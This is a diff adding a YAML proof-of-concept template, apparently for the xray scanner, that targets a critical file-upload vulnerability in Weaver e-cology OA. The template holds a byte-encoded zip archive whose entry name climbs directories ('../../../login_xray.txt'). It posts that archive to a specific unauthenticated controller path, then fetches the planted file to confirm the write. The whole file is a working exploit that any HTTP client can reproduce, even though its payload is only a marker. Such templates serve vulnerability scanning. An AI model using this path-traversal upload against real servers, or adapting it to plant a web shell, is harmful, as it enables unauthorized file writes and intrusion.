@@ -1,0 +1,35 @@
+name: yaml-poc-weaver-weaver_e_cology_oa-file_upload-CT-530634
+binding: 635e3913-4388-442e-b570-7537a2346b7c
+detail:
+    author: haiqing.chen
+    vulnerability:
+        id: 7b2fb2bc-4fc5-4ff9-9217-99a3903a5578
+        level: critical
+    warning: File Upload
+transport: http
+set:
+    rboundary: randomInt(40000000000000, 50000000000000)
+    zipData: b'\x50\x4b\x03\x04\x14\x00\x00\x00\x08\x00\x16\xa5\xa8\x56\x2f\x78\x85\x8d\x06\x00\x00\x00\x04\x00\x00\x00\x17\x00\x00\x00\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x6c\x6f\x67\x69\x6e\x5f\x78\x72\x61\x79\x2e\x74\x78\x74\xab\x28\x4a\xac\x04\x00\x50\x4b\x01\x02\x14\x03\x14\x00\x00\x00\x08\x00\x16\xa5\xa8\x56\x2f\x78\x85\x8d\x06\x00\x00\x00\x04\x00\x00\x00\x17\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x01\x00\x00\x00\x00\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x6c\x6f\x67\x69\x6e\x5f\x78\x72\x61\x79\x2e\x74\x78\x74\x50\x4b\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00\x45\x00\x00\x00\x3b\x00\x00\x00\x00\x00'
+rules:
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp
+            headers:
+                Content-Type: multipart/form-data; boundary=----{{rboundary}}
+            body: |-
+                ------{{rboundary}}
+                Content-Disposition: form-data; name="file"; filename="test.zip"
+                Content-Type: application/zip
+
+                {{zipData}}
+                ------{{rboundary}}--
+        expression: response.status == 200
+    r2:
+        request:
+            cache: true
+            method: GET
+            path: /cloudstore/login_xray.txt
+        expression: response.body_string == 'xray'
+expression: r1() && r2()
